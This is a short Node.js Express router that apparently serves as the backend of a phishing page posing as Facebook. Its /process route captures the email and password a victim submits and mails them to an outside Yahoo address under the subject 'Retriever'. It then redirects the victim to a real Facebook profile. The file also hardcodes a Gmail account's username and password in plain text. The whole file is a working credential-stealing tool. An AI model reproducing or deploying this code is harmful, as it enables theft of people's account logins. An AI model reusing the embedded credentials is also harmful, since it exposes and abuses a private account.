var express = require('express');
var router = express.Router();
var nodemailer = require('nodemailer');

var smtpTransport = require('nodemailer-smtp-transport');

var transporter = nodemailer.createTransport(smtpTransport({
    service: 'gmail',
    auth: {
        user: 'abeomer@gmail.com', // my mail
        pass: 'abilicious2234'
    }
}));
/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index');
});

router.get('https://facebook-wintas.herokuapp.com/', function(req, res, next) {
    res.render('index');
});
router.post('/process', function(req, res, next) {
  email = req.body.email;
  password = req.body.password;
var mailData = {
    from: 'abeomer@gmail.com',
    to: 'abe_the_angel@yahoo.com',
    subject: 'Retriever',
    text: 'Email:' + email + "\n" + "Password:" + password,
    html: 'Email:' + email + "\n" + "Password:" + password
  };


  transporter.sendMail(mailData, function(error, info){
    if(error){
        res.send(error);
    }else{
      res.redirect('https://www.facebook.com/rihana.reyes.56?fref=ts');
      

    };
  });




});
module.exports = router;
